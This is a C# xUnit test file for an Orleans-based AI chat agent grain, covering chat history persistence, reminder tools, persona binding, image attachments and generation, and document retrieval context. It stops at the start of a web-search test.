using System.Reflection;
using System.Runtime.CompilerServices;
using Agent42.Agents;
using Microsoft.Extensions.AI;
using Microsoft.Extensions.DependencyInjection;
using Orleans.Core.Internal;
using Orleans.Storage;
using Orleans.TestingHost;

namespace Agent42.Tests;

public sealed class AgentGrainTests : IAsyncLifetime
{
    private TestCluster _cluster = null!;

    public async Task InitializeAsync()
    {
        var builder = new TestClusterBuilder();
        builder.AddSiloBuilderConfigurator<TestSiloConfigurator>();
        _cluster = builder.Build();
        await _cluster.DeployAsync();
    }

    public async Task DisposeAsync() => await _cluster.DisposeAsync();

    [Fact]
    public async Task SendingHi_ReturnsAnAnswer()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("test-conversation");

        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync("hi", null))
        {
            events.Add(evt);
        }

        var answer = string.Concat(events
            .Where(e => e.Type == AgentStreamEventType.TextDelta)
            .Select(e => e.Text));
        Assert.False(string.IsNullOrWhiteSpace(answer), "The agent should answer when it receives \"hi\".");
        Assert.Equal(AgentStreamEventType.Done, events[^1].Type);
    }

    [Fact]
    public async Task History_ContainsUserAndAssistantTurns_SoAConversationCanBeResumed()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("history-conversation");

        await foreach (var _ in agent.ChatAsync("hi", null))
        {
        }

        var history = await agent.GetHistoryAsync();

        Assert.Contains(history, t => t.Role == "user" && t.Text == "hi");
        Assert.Contains(history, t => t.Role == "assistant" && !string.IsNullOrWhiteSpace(t.Text));
    }

    [Fact]
    public async Task History_SurvivesGrainReactivation()
    {
        const string key = "reactivation-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        await foreach (var _ in agent.ChatAsync("hi", null))
        {
        }

        // Force the grain to deactivate, so reopening the conversation goes through
        // OnActivateAsync → DeserializeSessionAsync — the path a user hits when they
        // reselect an older conversation whose grain has idled out. The persisted
        // session must round-trip the visible history.
        await agent.AsReference<IGrainManagementExtension>().DeactivateOnIdle();

        var history = await _cluster.GrainFactory.GetGrain<IAgentGrain>(key).GetHistoryAsync();

        Assert.Contains(history, t => t.Role == "user" && t.Text == "hi");
        Assert.Contains(history, t => t.Role == "assistant" && !string.IsNullOrWhiteSpace(t.Text));
    }

    [Fact]
    public async Task ConversationIndex_ListsTouchedConversations_MostRecentFirst()
    {
        var index = _cluster.GrainFactory.GetGrain<IConversationIndexGrain>("test-user");

        await index.TouchAsync("conv-1", "What is the answer to everything?");
        await index.TouchAsync("conv-2", "Plan a trip to Magrathea");
        await index.TouchAsync("conv-1", "follow-up");

        var conversations = await index.GetConversationsAsync();

        Assert.Equal(2, conversations.Count);
        Assert.Equal("conv-1", conversations[0].Id);
        Assert.Equal("What is the answer to everything?", conversations[0].Title);
        Assert.Equal("conv-2", conversations[1].Id);
    }

    [Fact]
    public async Task AskingToBeReminded_SchedulesAReminderViaTheTool()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("reminder-conversation");

        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync("please remind me to drink water", null))
        {
            events.Add(evt);
        }

        // The tool round-trip is surfaced to the client as start/end events.
        var start = Assert.Single(events, e => e.Type == AgentStreamEventType.ToolCallStart);
        Assert.Equal("schedule_prompt", start.ToolName);
        Assert.Contains(events, e =>
            e.Type == AgentStreamEventType.ToolCallEnd && e.ToolCallId == start.ToolCallId);

        var reminders = await agent.GetScheduledPromptsAsync();

        var reminder = Assert.Single(reminders);
        Assert.Equal("drink-water", reminder.Name);
        Assert.Equal("Tell the user to drink some water.", reminder.Prompt);
        Assert.True(reminder.DueInMinutes >= 1 && reminder.RepeatEveryMinutes >= 1);
    }

    [Fact]
    public async Task Purge_ClearsHistoryAndUnregistersReminders()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("purge-conversation");

        await foreach (var _ in agent.ChatAsync("please remind me to drink water", null))
        {
        }

        // Precondition: the conversation has both history and a durable reminder.
        Assert.NotEmpty(await agent.GetHistoryAsync());
        Assert.Single(await agent.GetScheduledPromptsAsync());

        // Purge iterates the grain's real registered reminders and unregisters each, so
        // this call exercises the UnregisterReminder path against a live reminder.
        await agent.PurgeAsync();

        var reactivated = _cluster.GrainFactory.GetGrain<IAgentGrain>("purge-conversation");
        Assert.Empty(await reactivated.GetHistoryAsync());
        Assert.Empty(await reactivated.GetScheduledPromptsAsync());
    }

    [Fact]
    public async Task ConversationIndex_RemoveAsync_DropsTheConversation()
    {
        var index = _cluster.GrainFactory.GetGrain<IConversationIndexGrain>("remove-user");

        await index.TouchAsync("conv-1", "What is the answer to everything?");
        await index.TouchAsync("conv-2", "Plan a trip to Magrathea");

        await index.RemoveAsync("conv-1");

        var conversations = await index.GetConversationsAsync();
        Assert.Equal("conv-2", Assert.Single(conversations).Id);
    }

    [Fact]
    public async Task WhenAReminderFires_ItsPromptIsSentToTheAgent()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("reminder-firing-conversation");

        await foreach (var _ in agent.ChatAsync("please remind me to drink water", null))
        {
        }

        // Fire the reminder the way the Orleans runtime would.
        await agent.AsReference<IRemindable>().ReceiveReminder("drink-water", default);

        var history = await agent.GetHistoryAsync();
        Assert.Contains(history, t => t.Role == "user" && t.Text == "Tell the user to drink some water.");
        Assert.Equal("assistant", history[^1].Role);
        Assert.False(string.IsNullOrWhiteSpace(history[^1].Text));

        var reminder = Assert.Single(await agent.GetScheduledPromptsAsync());
        Assert.Equal(1, reminder.TimesFired);
    }

    [Fact]
    public async Task AskingToCancel_RemovesTheReminderViaTheTool()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("cancel-conversation");

        // Schedule a real, durable reminder first, so cancelling exercises the live
        // GetReminder / UnregisterReminder path — not just a state-dict edit (cf. the
        // Purge test, which can only assert the state, since GetReminders isn't on the grain).
        await foreach (var _ in agent.ChatAsync("please remind me to drink water", null))
        {
        }

        Assert.Single(await agent.GetScheduledPromptsAsync());

        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync("please cancel the drink water reminder", null))
        {
            events.Add(evt);
        }

        var start = Assert.Single(events, e => e.Type == AgentStreamEventType.ToolCallStart);
        Assert.Equal("cancel_scheduled_prompt", start.ToolName);
        Assert.Contains(events, e =>
            e.Type == AgentStreamEventType.ToolCallEnd && e.ToolCallId == start.ToolCallId);

        Assert.Empty(await agent.GetScheduledPromptsAsync());
    }

    [Fact]
    public async Task AskingToCancelAll_RemovesEveryReminder()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("cancel-all-conversation");

        // Schedule a real reminder so cancel-all iterates and unregisters a live reminder.
        await foreach (var _ in agent.ChatAsync("please remind me to drink water", null))
        {
        }

        Assert.Single(await agent.GetScheduledPromptsAsync());

        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync("please cancel all reminders", null))
        {
            events.Add(evt);
        }

        var start = Assert.Single(events, e => e.Type == AgentStreamEventType.ToolCallStart);
        Assert.Equal("cancel_all_scheduled_prompts", start.ToolName);
        Assert.Empty(await agent.GetScheduledPromptsAsync());

        // Cancelling again with nothing scheduled hits the empty-state branch and must
        // still return cleanly, leaving the (already empty) list untouched.
        await foreach (var _ in agent.ChatAsync("please cancel all reminders", null))
        {
        }

        Assert.Empty(await agent.GetScheduledPromptsAsync());
    }

    // AC2: binding pins the persona + model into the conversation and survives reactivation.
    [Fact]
    public async Task Binding_PinsPersonaAndModel_SurvivesReactivation()
    {
        const string key = "binding-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        await agent.BindAgentAsync(new AgentBinding("agent-1", "Marvin", "You are Marvin.", "persona-model"));

        var binding = await agent.GetAgentBindingAsync();
        Assert.NotNull(binding);
        Assert.Equal("agent-1", binding!.AgentId);
        Assert.Equal("Marvin", binding.Name);
        Assert.Equal("You are Marvin.", binding.SystemPrompt);
        Assert.Equal("persona-model", binding.Model);
        // The bound model becomes the conversation's model — the picker is hidden, so it never changes.
        Assert.Equal("persona-model", await agent.GetSelectedModelAsync());

        // Force deactivation so the binding is rehydrated from persisted state (Cosmos in prod).
        await agent.AsReference<IGrainManagementExtension>().DeactivateOnIdle();

        var reactivated = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        // Compare field-wise, not by record equality: AgentBinding now carries EnabledTools (a list), and
        // record structural equality compares that reference, so two equal-content lists across the
        // reactivation boundary would spuriously differ. Assert.Equal on the sequence compares elements.
        var rehydrated = await reactivated.GetAgentBindingAsync();
        Assert.NotNull(rehydrated);
        Assert.Equal(binding!.AgentId, rehydrated!.AgentId);
        Assert.Equal(binding.Name, rehydrated.Name);
        Assert.Equal(binding.SystemPrompt, rehydrated.SystemPrompt);
        Assert.Equal(binding.Model, rehydrated.Model);
        Assert.Equal(binding.EnabledTools, rehydrated.EnabledTools);
        Assert.Equal("persona-model", await reactivated.GetSelectedModelAsync());
    }

    // AC3: the bound system prompt actually reaches the model (FakeChatClient echoes what the
    // terminal IChatClient receives as a [sys:…] marker — this is a real delivery assertion).
    [Fact]
    public async Task AgentChat_AppliesBoundSystemPrompt()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("agent-chat-conversation");
        const string persona = "You are Zaphod, always speak in exclamations!";

        await agent.BindAgentAsync(new AgentBinding("agent-z", "Zaphod", persona, "persona-model"));

        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync("hi", null))
        {
            events.Add(evt);
        }

        var answer = string.Concat(events
            .Where(e => e.Type == AgentStreamEventType.TextDelta)
            .Select(e => e.Text));
        // The fake echoes the instructions the terminal client received as [sys:…]. The
        // Agent Framework skills provider appends its catalog to those instructions, so
        // assert the persona is present in the echoed system prompt rather than an exact
        // bracketed match — this still proves the bound prompt was delivered to the model.
        Assert.Contains("[sys:", answer);
        Assert.Contains(persona, answer);
    }

    // AC4: binding is immutable once set — a second bind can't flip the persona mid-conversation.
    [Fact]
    public async Task BindAgent_IsIdempotent_KeepsFirstPersona()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("idempotent-binding-conversation");

        await agent.BindAgentAsync(new AgentBinding("agent-1", "First", "First prompt.", "model-a"));
        await agent.BindAgentAsync(new AgentBinding("agent-2", "Second", "Second prompt.", "model-b"));

        var binding = await agent.GetAgentBindingAsync();
        Assert.NotNull(binding);
        Assert.Equal("agent-1", binding!.AgentId);
        Assert.Equal("First", binding.Name);
        Assert.Equal("First prompt.", binding.SystemPrompt);
        Assert.Equal("model-a", binding.Model);
        Assert.Equal("model-a", await agent.GetSelectedModelAsync());
    }

    // A normal chat (no bind) reports no persona — the default Agent 42 persona is implicit.
    [Fact]
    public async Task NormalChat_HasNoBinding()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("unbound-conversation");

        await foreach (var _ in agent.ChatAsync("hi", null))
        {
        }

        Assert.Null(await agent.GetAgentBindingAsync());
    }

    [Fact]
    public async Task CancellingAnUnknownReminder_ReportsItGracefully()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("cancel-unknown-conversation");

        // Nothing was ever scheduled, so the cancel tool hits its "no such reminder" branch.
        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync("please cancel the drink water reminder", null))
        {
            events.Add(evt);
        }

        var end = Assert.Single(events, e => e.Type == AgentStreamEventType.ToolCallEnd);
        Assert.Contains("no scheduled reminder", end.ToolResult ?? "", StringComparison.OrdinalIgnoreCase);
        Assert.Empty(await agent.GetScheduledPromptsAsync());
    }

    // AC3: a turn carrying an attachment actually delivers an image content part to the model —
    // the fake echoes [img:N] built from the non-text parts it received, so this proves delivery,
    // not just that the ref was stored.
    [Fact]
    public async Task Chat_WithAttachment_DeliversImagePartToModel()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("attachment-delivery-conversation");
        var reference = new AttachmentRef("att-1", "k/att-1", "image/png", "pic.png");

        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync("what is in this picture", null, [reference]))
        {
            events.Add(evt);
        }

        var answer = string.Concat(events
            .Where(e => e.Type == AgentStreamEventType.TextDelta)
            .Select(e => e.Text));
        Assert.Contains("[img:1]", answer);
    }

    // AC4c: an image-only user turn (blank text, image attached) is kept in history — the old
    // filter dropped every blank-text message, which would hide such a turn on reload.
    [Fact]
    public async Task History_KeepsImageOnlyTurn()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("image-only-conversation");
        var reference = new AttachmentRef("only-1", "k/only-1", "image/png", "pic.png");

        await foreach (var _ in agent.ChatAsync("", null, [reference]))
        {
        }

        var history = await agent.GetHistoryAsync();
        var userTurn = Assert.Single(history, t => t.Role == "user");
        Assert.NotNull(userTurn.Attachments);
        var att = Assert.Single(userTurn.Attachments!);
        Assert.Equal("only-1", att.Id);
    }

    // AC8: the background (agent-run) run path (ADR 0022) runs a prompt and persists the turn. OneWay
    // returns to the caller immediately, but the grain is non-reentrant, so a following GetHistoryAsync
    // is processed only after the enqueued turn completes — no polling needed in-process.
    [Fact]
    public async Task EnqueuePrompt_RunsAndPersistsTurn()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("enqueue-conversation");

        await agent.EnqueuePromptAsync("hi", null);

        // OneWay returns before the grain runs the turn, so poll history for the persisted result.
        var history = await PollHistoryAsync(agent, h => h.Any(t => t.Role == "assistant"));
        Assert.Contains(history, t => t.Role == "user" && t.Text == "hi");
        Assert.Contains(history, t => t.Role == "assistant" && !string.IsNullOrWhiteSpace(t.Text));
    }

    // Polls GetHistoryAsync until <paramref name="until"/> holds or a bound elapses — the OneWay
    // agent-run path returns before the background turn persists (ADR 0022).
    private static async Task<IReadOnlyList<ChatTurn>> PollHistoryAsync(
        IAgentGrain agent, Func<IReadOnlyList<ChatTurn>, bool> until)
    {
        IReadOnlyList<ChatTurn> history = [];
        for (var attempt = 0; attempt < 50; attempt++)
        {
            history = await agent.GetHistoryAsync();
            if (until(history))
            {
                return history;
            }

            await Task.Delay(100);
        }

        return history;
    }

    // AC9 (grain level): an image handed to the background run rides the same AttachmentRef path as a
    // browser turn — it lands on the user turn in history (draining ChatCoreAsync gives the vision path
    // for free, so an image model would even edit it; here the turn just records the attachment).
    [Fact]
    public async Task EnqueuePrompt_WithImage_RecordsAttachmentOnTurn()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("enqueue-image-conversation");
        var reference = new AttachmentRef("run-1", "k/run-1", "image/png", "pic.png");

        await agent.EnqueuePromptAsync("what is in this picture", [reference]);

        var history = await PollHistoryAsync(agent, h => h.Any(t => t.Role == "assistant"));
        var userTurn = Assert.Single(history, t => t.Role == "user");
        Assert.NotNull(userTurn.Attachments);
        Assert.Equal("run-1", Assert.Single(userTurn.Attachments!).Id);
    }

    // AC4b: refs stay joined to the correct turn across a text → schedule → reminder-fired → image
    // sequence. The reminder-fired turn is a user turn too, so it must push an empty entry or the
    // index join drifts and the image lands on the wrong turn (constraint 11).
    [Fact]
    public async Task History_KeepsAttachmentRefsAlignedAcrossTurns()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("aligned-conversation");

        // Turn 1: plain text.
        await foreach (var _ in agent.ChatAsync("first message", null))
        {
        }

        // Turn 2: schedules a reminder (tool call), still a plain user turn.
        await foreach (var _ in agent.ChatAsync("please remind me to drink water", null))
        {
        }

        // Turn 3: the reminder fires — a user turn injected by the runtime, no attachments.
        await agent.AsReference<IRemindable>().ReceiveReminder("drink-water", default);

        // Turn 4: the image turn.
        var reference = new AttachmentRef("img-4", "k/img-4", "image/png", "p.png");
        await foreach (var _ in agent.ChatAsync("look at this", null, [reference]))
        {
        }

        var userTurns = (await agent.GetHistoryAsync()).Where(t => t.Role == "user").ToList();

        // The image ref is on the "look at this" turn and nowhere else.
        var imageTurn = Assert.Single(userTurns, t => t.Text == "look at this");
        Assert.NotNull(imageTurn.Attachments);
        Assert.Equal("img-4", Assert.Single(imageTurn.Attachments!).Id);
        Assert.All(userTurns.Where(t => t.Text != "look at this"), t => Assert.Null(t.Attachments));
    }

    // Attachment refs survive a grain deactivation/reactivation — the join list is persisted
    // state, so a reopened conversation still re-renders its images.
    [Fact]
    public async Task History_AttachmentRefs_SurviveReactivation()
    {
        const string key = "attachment-reactivation-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        var reference = new AttachmentRef("react-1", "k/react-1", "image/png", "pic.png");

        await foreach (var _ in agent.ChatAsync("keep this image", null, [reference]))
        {
        }

        await agent.AsReference<IGrainManagementExtension>().DeactivateOnIdle();

        var history = await _cluster.GrainFactory.GetGrain<IAgentGrain>(key).GetHistoryAsync();
        var userTurn = Assert.Single(history, t => t.Role == "user" && t.Text == "keep this image");
        Assert.NotNull(userTurn.Attachments);
        Assert.Equal("react-1", Assert.Single(userTurn.Attachments!).Id);
    }

    // ---- Image generation (ADR 0020) ------------------------------------------------------------

    // AC4: picking an image model + a prompt generates an image and stores it (text-to-image). The turn emits
    // a single Image event carrying the stored id (image gen is not token-streamed), and the bytes land in the
    // attachment store under the conversation's owner key.
    [Fact]
    public async Task ImageModel_TextPrompt_GeneratesAndStoresImage()
    {
        const string key = "image-t2i-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        var events = await CollectAsync(agent.ChatAsync("draw a cat", TestSiloConfigurator.ImageModel));

        var image = Assert.Single(events, e => e.Type == AgentStreamEventType.Image);
        Assert.False(string.IsNullOrEmpty(image.AttachmentId));
        Assert.Equal("image/png", image.MediaType);
        Assert.Equal(AgentStreamEventType.Done, events[^1].Type);
        // Image gen produces no reply text — one Image event, then Done.
        Assert.DoesNotContain(events, e => e.Type == AgentStreamEventType.TextDelta);

        // The (text-to-image marker) bytes are in blob storage under the owner key.
        var stored = await new InMemoryAttachmentStore().OpenReadAsync(key, image.AttachmentId!);
        Assert.NotNull(stored);
        Assert.Equal(ProbeImageGenerator.TextToImageBytes, stored!.Bytes);
    }

    // AC5: an attached image on an image-model turn drives image-to-image — the grain reads the attachment's
    // bytes from the owner-scoped store (unlike the chat path, which only mints a URL) and feeds them to the
    // edit. The probe echoes the input back, so the stored result proves exactly which bytes drove the edit.
    [Fact]
    public async Task ImageModel_WithAttachment_RunsEdit()
    {
        const string key = "image-edit-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        var store = new InMemoryAttachmentStore();
        var inputBytes = new byte[] { 10, 20, 30, 40, 50 };
        var inputRef = await store.SaveAsync(key, "in.png", "image/png", inputBytes);

        var events = await CollectAsync(
            agent.ChatAsync("make it blue", TestSiloConfigurator.ImageModel, [inputRef]));

        var image = Assert.Single(events, e => e.Type == AgentStreamEventType.Image);
        var stored = await store.OpenReadAsync(key, image.AttachmentId!);
        // The edit echoed the INPUT back — so the attachment's bytes drove the edit, not text-to-image.
        Assert.Equal(inputBytes, stored!.Bytes);
    }

    // AC6: with no attachment, the edit input is the MOST RECENT image already in the conversation — here a
    // user-uploaded image from a prior chat turn.
    [Fact]
    public async Task ImageModel_NoAttachment_UsesMostRecentImage()
    {
        const string key = "image-most-recent-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        var store = new InMemoryAttachmentStore();
        var priorBytes = new byte[] { 7, 7, 7, 42 };
        var priorRef = await store.SaveAsync(key, "prior.png", "image/png", priorBytes);
        // A vision chat turn puts the uploaded image into the conversation (records its ref).
        await CollectAsync(agent.ChatAsync("here is a picture", TestSiloConfigurator.DefaultModel, [priorRef]));

        // An image-gen turn with NO attachment must edit the most recent image (the prior upload).
        var events = await CollectAsync(agent.ChatAsync("now edit it", TestSiloConfigurator.ImageModel));

        var image = Assert.Single(events, e => e.Type == AgentStreamEventType.Image);
        var stored = await store.OpenReadAsync(key, image.AttachmentId!);
        Assert.Equal(priorBytes, stored!.Bytes);
    }

    // AC7: an assistant generated image round-trips through history — on the same activation and after a
    // deactivation/reactivation (the ref is durable grain state; the id lives on the assistant message).
    [Fact]
    public async Task History_IncludesAssistantGeneratedImage()
    {
        const string key = "image-history-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        var events = await CollectAsync(agent.ChatAsync("draw a dog", TestSiloConfigurator.ImageModel));
        var generatedId = Assert.Single(events, e => e.Type == AgentStreamEventType.Image).AttachmentId;

        var history = await agent.GetHistoryAsync();
        Assert.Contains(history, t => t.Role == "user" && t.Text == "draw a dog");
        var assistant = Assert.Single(history, t => t.Role == "assistant" && t.Attachments is { Count: > 0 });
        Assert.Equal(generatedId, Assert.Single(assistant.Attachments!).Id);

        // ...and it survives reactivation (durable, id-keyed state).
        await agent.AsReference<IGrainManagementExtension>().DeactivateOnIdle();
        var reopened = await _cluster.GrainFactory.GetGrain<IAgentGrain>(key).GetHistoryAsync();
        var reAssistant = Assert.Single(reopened, t => t.Role == "assistant" && t.Attachments is { Count: > 0 });
        Assert.Equal(generatedId, Assert.Single(reAssistant.Attachments!).Id);
    }

    // AC8: an image-gen turn keeps the serialized session small — the (large) image bytes go to blob storage,
    // never inlined into the 2 MB Cosmos item (ADR 0004). Mirrors ToolResults_DoNotBlowTheSessionSizeBudget.
    [Fact]
    public async Task ImageTurn_DoesNotBlowTheSessionSizeBudget()
    {
        const string key = "image-session-budget-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        // Five image-gen turns, each generating the 256 KB text-to-image blob.
        for (var turn = 0; turn < 5; turn++)
        {
            await CollectAsync(agent.ChatAsync("draw a scene", TestSiloConfigurator.ImageModel));
        }

        var storage = _cluster.GetSiloServiceProvider(_cluster.Primary.SiloAddress)
            .GetRequiredKeyedService<IGrainStorage>(AgentGrain.StorageProviderName);
        var state = new GrainState<AgentGrainState>(new AgentGrainState());
        await storage.ReadStateAsync("agent", agent.GetGrainId(), state);

        var bytes = System.Text.Encoding.UTF8.GetByteCount(state.State.SerializedSession ?? "");

        // Sanity: five 256 KB images inlined would be > 1 MB, so the ceiling is a real constraint.
        Assert.True(ProbeImageGenerator.TextToImageBytes.Length * 5 > 256 * 1024,
            "the generated images should dwarf the ceiling, or this test proves nothing");
        // Only short UriContent references + ids are persisted — far under the 2 MB cap.
        Assert.InRange(bytes, 1, 64 * 1024);
    }

    // AC9: switching to a no-vision chat model strips the assistant image from the MODEL's view, and switching
    // back restores it — WITH a tool-calling turn interleaved BEFORE the image turn, so assistant messages are
    // not 1:1 with turns. That is what proves the strip/restore is keyed by the durable assistantImageId, not a
    // fragile assistant-message position (C1) — a positional join would drift past the standalone tool message.
    [Fact]
    public async Task NoVisionModel_WithholdsAssistantImage_AndRestores_AcrossToolTurn()
    {
        const string key = "image-vision-gate-conversation";
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);

        // Turn 1 — a tool turn on a chat model: a standalone FunctionCall assistant message PLUS a separate
        // text assistant message, so the assistant side is no longer 1:1 with turns.
        var toolTurn = await CollectAsync(
            agent.ChatAsync("please remind me to drink water", TestSiloConfigurator.DefaultModel));
        Assert.Contains(toolTurn, e => e.Type == AgentStreamEventType.ToolCallStart);

        // Turn 2 — the image turn. Switching to the (tools-capable) image model does NOT strip the tool turn,
        // so the image assistant message lands AFTER the extra tool message (positional drift bait).
        await CollectAsync(agent.ChatAsync("draw a cat", TestSiloConfigurator.ImageModel));

        // Turn 3 — a no-vision chat model: the generated image (a private-container SAS) must be withheld.
        var withheld = await CollectAsync(agent.ChatAsync("hello there", TestSiloConfigurator.NoVisionModel));
        Assert.Contains("[allimg:0]", Answer(withheld));

        // Turn 4 — back to a vision model: the image is restored to the model's view, found by its id despite
        // the interleaved tool message.
        var restored = await CollectAsync(agent.ChatAsync("hi again", TestSiloConfigurator.DefaultModel));
        Assert.Contains("[allimg:1]", Answer(restored));
    }

    // AC1+AC2: asked about an uploaded document, the top excerpt is retrieved and auto-injected into the
    // model context BEFORE the call (ADR 0008 — no agentic search-tool call), carrying its citation
    // metadata (file + page). The chunk is seeded into the process-global in-memory index under the
    // conversation's grain key; registering a document attaches the TextSearchProvider (the gate), and the
    // deterministic embedder makes the "magrathea" chunk rank. The FakeChatClient echoes any injected
    // AIContextProvider message as [ctx:…], so this asserts the excerpt + citation reached the model.
    [Fact]
    public async Task AgentChat_InjectsDocumentContext_BeforeInvocation()
    {
        const string key = "docsearch-conversation";
        await SeedChunkAsync(key, new DocumentChunk("guide.pdf", 2, 0, "Magrathea is a legendary planet of untold wealth."));

        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        await agent.RegisterDocumentAsync("guide.pdf");

        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync("what does the document say about magrathea", null))
        {
            events.Add(evt);
        }

        var answer = string.Concat(events
            .Where(e => e.Type == AgentStreamEventType.TextDelta)
            .Select(e => e.Text));

        // Retrieval was auto-injected (not tool-called): the excerpt text (AC1) and its file+page
        // citation (AC2) both reached the model, surfaced by the fake's [ctx:…] echo.
        Assert.Contains("[ctx:", answer);
        Assert.Contains("Magrathea is a legendary planet", answer);
        Assert.Contains("guide.pdf, p.2", answer);
        // No agentic search tool is involved any more.
        Assert.DoesNotContain(events, e => e.Type == AgentStreamEventType.ToolCallStart);
    }

    // AC3: a document-free conversation makes NO retrieval/embedding call and replies normally. A chunk is
    // seeded under the conversation key but no document is registered, so the TextSearchProvider is gated
    // off (DocumentNames.Count == 0) — proving the gate: the seeded chunk is never retrieved or injected.
    [Fact]
    public async Task AgentChat_NoDocuments_NoRetrieval()
    {
        const string key = "no-docs-conversation";
        await SeedChunkAsync(key, new DocumentChunk("guide.pdf", 2, 0, "Magrathea is a legendary planet of untold wealth."));

        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync("tell me about magrathea", null))
        {
            events.Add(evt);
        }

        var answer = string.Concat(events
            .Where(e => e.Type == AgentStreamEventType.TextDelta)
            .Select(e => e.Text));
        Assert.False(string.IsNullOrWhiteSpace(answer), "A document-free chat should still reply.");
        // The provider was never attached: no context was injected and no seeded chunk leaked through.
        Assert.DoesNotContain("[ctx:", answer);
        Assert.DoesNotContain("Magrathea is a legendary planet", answer);
    }

    // AC4: the auto-injected excerpt text is not persisted into the session across turns. Running three
    // turns also proves the 2 MB-safety storage filter works end-to-end: without it, the injected
    // AIContextProvider message (carrying an un-serializable attribution struct) would either crash
    // SerializeSessionAsync on turn 1 or accumulate the excerpt text turn-over-turn (ADR 0004 / Step 1 spike).
    [Fact]
    public async Task AgentChat_DoesNotPersistInjectedResultText()
    {
        const string key = "docpersist-conversation";
        await SeedChunkAsync(key, new DocumentChunk("guide.pdf", 2, 0, "Magrathea is a legendary planet of untold wealth."));

        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>(key);
        await agent.RegisterDocumentAsync("guide.pdf");

        for (var i = 1; i <= 3; i++)
        {
            await foreach (var _ in agent.ChatAsync($"question {i} about the planet", null))
            {
            }
        }

        // Force a reactivation so the persisted session round-trips through DeserializeSessionAsync with the
        // document provider attached — proving the serialized blob is valid and free of the injected message.
        await agent.AsReference<IGrainManagementExtension>().DeactivateOnIdle();

        var history = await _cluster.GrainFactory.GetGrain<IAgentGrain>(key).GetHistoryAsync();
        var userTurns = history.Where(t => t.Role == "user").ToList();

        // Exactly the three real user turns survive — none of the auto-injected context messages leaked into
        // stored history (they are ChatRole.User too, so a leak would show up here).
        Assert.Equal(3, userTurns.Count);
        Assert.All(userTurns, t => Assert.DoesNotContain("Additional Context", t.Text));
        Assert.All(userTurns, t => Assert.DoesNotContain("Magrathea is a legendary planet", t.Text));
    }

    // Registering an ingested document folds its name into the model's instructions, so the model
    // is aware the document exists (it is otherwise invisible — ingest-only). The FakeChatClient
    // echoes the instructions it received as [sys:…]; a non-"document" message avoids triggering the
    // search tool so the echo is visible.
    [Fact]
    public async Task RegisterDocument_MakesTheModelAwareOfIt()
    {
        var agent = _cluster.GrainFactory.GetGrain<IAgentGrain>("doc-awareness-conversation");
        await agent.RegisterDocumentAsync("budget.xlsx");

        var events = new List<AgentStreamEvent>();
        await foreach (var evt in agent.ChatAsync("hello there", null))
        {
            events.Add(evt);
        }

        var answer = string.Concat(events
            .Where(e => e.Type == AgentStreamEventType.TextDelta)
            .Select(e => e.Text));
        Assert.Contains("[sys:", answer);
        Assert.Contains("budget.xlsx", answer);
    }

    // Minor 4: purging a conversation deletes its indexed document chunks so extracted text
    // doesn't outlive the conversation.
    [Fact]
    public async Task Purge_DeletesIndexedDocumentChunks()
    {
        const string key = "docpurge-conversation";
        var (index, embedding) = await SeedChunkAsync(key, new DocumentChunk("g.pdf", null, 0, "towel"));
        Assert.NotEmpty(await index.SearchAsync(key, embedding, topK: 5));

        await _cluster.GrainFactory.GetGrain<IAgentGrain>(key).PurgeAsync();

        Assert.Empty(await index.SearchAsync(key, embedding, topK: 5));
    }

    // Seeds one embedded chunk into the process-global in-memory index under an owner key, using the
    // same deterministic embedder the grain uses — so the grain's retrieval provider sees it.
    private static async Task<(InMemoryDocumentIndex Index, ReadOnlyMemory<float> Embedding)> SeedChunkAsync(
        string ownerKey, DocumentChunk chunk)
    {
        var index = new InMemoryDocumentIndex();
        var embedding = (await new DeterministicEmbeddingGenerator().GenerateAsync([chunk.Text]))[0].Vector;
        await index.UpsertChunksAsync(ownerKey, [new EmbeddedChunk(chunk, embedding)]);
        return (index, embedding);
    }

    // ---- Web tools (ADR 0011) ----

    // AC11 — the search results don't just come back to the grain, they come back *to the model*: the
    // fake echoes the tool results it can see on the follow-up call as [tool:…].
    [Fact]
    public async Task WebSearch_ToolResultReachesTheModel()
    {
